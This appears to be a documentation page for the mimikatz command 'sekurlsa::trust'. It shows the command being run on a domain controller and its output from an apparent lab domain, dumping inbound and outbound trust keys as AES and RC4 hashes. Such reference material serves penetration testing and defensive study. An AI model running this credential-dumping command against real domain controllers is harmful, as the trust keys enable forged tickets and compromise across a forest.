# trust

`sekurlsa::trust` retrieves the forest trust keys.

{% hint style="warning" %}
This command must be executed on a domain controller
{% endhint %}

```
mimikatz # sekurlsa::trust

Domain: HACKLAB.LOCAL (hacklab)

Domain: CHILD.HACKLAB.LOCAL (CHILD / S-1-5-21-778103268-3876162210-3043634658)

  [ Out ] CHILD.HACKLAB.LOCAL ->
        from: 2a 82 42 4c b5 4f 6e 8f f7 f1 b0 e6 74 38 09 19 28 97 7a bc 20 df 9a bc 6d d7 24 90 3f 4f d2 b5 d3 04 f4 59 8b 5a d2 63 39 7e 13 46 f5 a1 60 de be d0 fc 8f 0e 25 4f 97 5f 8c f1 6a 8e 91 a8 c5 0f ea 59 a7 29 ba 0d 46 99 b1 15 75 64 1e 4e 57 72 d8 9b 04 69 3e 50 b5 46 d2 ae c6 74 1a 73 ba 80 dd 7b 5c a6 f9 cd 58 74 ad 3e 26 01 63 8d 2c 19 97 6b 4c d4 39 8b a8 4e 55 84 01 50 2d 6d 36 14 38 bb 64 3a 17 4d 09 10 02 fe 80 9d c5 77 e4 92 a5 97 a2 2e 0f dd 20 bc 25 35 5f 17 a9 c0 74 8f 51 8e 9f 8f 05 9d 34 46 55 5a 96 5b 98 59 49 06 55 d8 85 53 1c 98 27 25 a7 9e 7a 04 77 4c ec c4 ce e0 12 85 25 91 18 30 15 af 1f 88 8b 08 1c 55 d8 05 fb a1 12 df be 4f e8 40 1e 1f b9 f8 25 cc f9 60 8c 38 04 c0 ba 34 3f 58 d0 be ef d2 f1 60 e7 d7 38 68 2c 0c 0f c5 42 cf 33 10 7b 13 e3
        * aes256_hmac       : c017ef4174c803d61f39d1e3855dc1ad50b735894af5c371bd9e5fc43d1d5ee8
        * aes128_hmac       : e5c79c67bbf855121cd239fc05e402b4
        * rc4_hmac_nt       : 9ade2d4a92b1c68ec7a1c2da0aa66523
        * rc4_hmac_old      : 9ade2d4a92b1c68ec7a1c2da0aa66523
        * rc4_md4           : 9ade2d4a92b1c68ec7a1c2da0aa66523
        * rc4_hmac_nt_exp   : 9ade2d4a92b1c68ec7a1c2da0aa66523
        * rc4_hmac_old_exp  : 9ade2d4a92b1c68ec7a1c2da0aa66523

  [  In ] -> CHILD.HACKLAB.LOCAL
        from: 2a 82 42 4c b5 4f 6e 8f f7 f1 b0 e6 74 38 09 19 28 97 7a bc 20 df 9a bc 6d d7 24 90 3f 4f d2 b5 d3 04 f4 59 8b 5a d2 63 39 7e 13 46 f5 a1 60 de be d0 fc 8f 0e 25 4f 97 5f 8c f1 6a 8e 91 a8 c5 0f ea 59 a7 29 ba 0d 46 99 b1 15 75 64 1e 4e 57 72 d8 9b 04 69 3e 50 b5 46 d2 ae c6 74 1a 73 ba 80 dd 7b 5c a6 f9 cd 58 74 ad 3e 26 01 63 8d 2c 19 97 6b 4c d4 39 8b a8 4e 55 84 01 50 2d 6d 36 14 38 bb 64 3a 17 4d 09 10 02 fe 80 9d c5 77 e4 92 a5 97 a2 2e 0f dd 20 bc 25 35 5f 17 a9 c0 74 8f 51 8e 9f 8f 05 9d 34 46 55 5a 96 5b 98 59 49 06 55 d8 85 53 1c 98 27 25 a7 9e 7a 04 77 4c ec c4 ce e0 12 85 25 91 18 30 15 af 1f 88 8b 08 1c 55 d8 05 fb a1 12 df be 4f e8 40 1e 1f b9 f8 25 cc f9 60 8c 38 04 c0 ba 34 3f 58 d0 be ef d2 f1 60 e7 d7 38 68 2c 0c 0f c5 42 cf 33 10 7b 13 e3
        * aes256_hmac       : 3469f9b3d956b9ef07eed609bbd00d93fb9abfa6aac97634a7734087c1495095
        * aes128_hmac       : f627919395751816d7d4d93267bbd4df
        * rc4_hmac_nt       : 9ade2d4a92b1c68ec7a1c2da0aa66523
        * rc4_hmac_old      : 9ade2d4a92b1c68ec7a1c2da0aa66523
        * rc4_md4           : 9ade2d4a92b1c68ec7a1c2da0aa66523
        * rc4_hmac_nt_exp   : 9ade2d4a92b1c68ec7a1c2da0aa66523
        * rc4_hmac_old_exp  : 9ade2d4a92b1c68ec7a1c2da0aa66523
```
